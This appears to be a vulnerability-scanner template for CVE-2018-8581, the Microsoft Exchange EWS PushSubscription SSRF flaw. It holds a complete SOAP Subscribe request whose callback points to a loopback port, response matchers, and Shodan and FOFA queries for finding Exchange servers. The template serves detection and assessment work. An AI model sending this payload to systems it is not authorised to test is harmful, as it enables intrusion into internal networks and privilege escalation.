id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - SSRF Elevation of Privilege
  author: gyanu2507
  severity: high
  description: |
    Microsoft Exchange Server contains a Server-Side Request Forgery (SSRF) vulnerability in the Exchange Web Services (EWS) PushSubscription feature
    that allows an attacker to make requests from the Exchange server to internal resources, potentially leading to elevation of privilege.
    The vulnerability exists in the PushSubscription functionality where the server processes callback URLs without proper validation.
  impact: |
    An attacker can exploit this vulnerability to perform SSRF attacks, potentially accessing internal network resources, performing port scanning,
    or escalating privileges by making requests to internal Exchange administrative endpoints that should not be accessible externally.
  remediation: |
    Apply Microsoft security updates for Exchange Server. Specifically, install the security update that addresses CVE-2018-8581.
    Additionally, restrict network access to Exchange servers and implement network segmentation to limit the impact of SSRF attacks.
  reference:
    - https://vulncheck.com/xdb/276c34c7f74f
    - https://vulncheck.com/xdb/7730cd30a582
    - https://vulncheck.com/xdb/d7f23b749ff9
    - https://vulncheck.com/xdb/dba145cf3cba
    - https://vulncheck.com/xdb/3d3434d62f82
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://github.com/Ridter/Exchange2domain
    - https://github.com/qiantu88/CVE-2018-8581
    - https://github.com/WyAtu/CVE-2018-8581
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-918
    cpe: cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: microsoft
    product: exchange_server
    shodan-query: 'cpe:"cpe:2.3:a:microsoft:exchange_server"'
    fofa-query: 'app="Microsoft-Exchange"'
  tags: cve,cve2018,ssrf,microsoft,exchange,ews,privilege-escalation,kev,vkev

variables:
  rand_callback: "http://127.0.0.1:{{rand_int(8000,9000)}}/{{randstr}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/ews/exchange.asmx"
      - "{{BaseURL}}/EWS/Exchange.asmx"
      - "{{BaseURL}}/ecp/EWS/Exchange.asmx"

    headers:
      Content-Type: text/xml; charset=utf-8
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/Subscribe"

    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                     xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                     xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
        <soap:Header>
          <t:RequestServerVersion Version="Exchange2013" />
        </soap:Header>
        <soap:Body>
          <m:Subscribe>
            <m:PushSubscriptionRequest>
              <t:EventTypes>
                <t:EventType>NewMailEvent</t:EventType>
              </t:EventTypes>
              <t:StatusFrequency>1</t:StatusFrequency>
              <t:URL>{{rand_callback}}</t:URL>
            </m:PushSubscriptionRequest>
          </m:Subscribe>
        </soap:Body>
      </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "SubscribeResponse"
          - "SubscriptionId"
        condition: and

      - type: regex
        part: body
        regex:
          - '<m:SubscriptionId>([^<]+)</m:SubscriptionId>'
        condition: or

      - type: word
        part: body
        words:
          - "m:ResponseCode"
          - "NoError"
        condition: or

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "X-OWA-Version"
          - "Microsoft-Exchange"
        condition: or
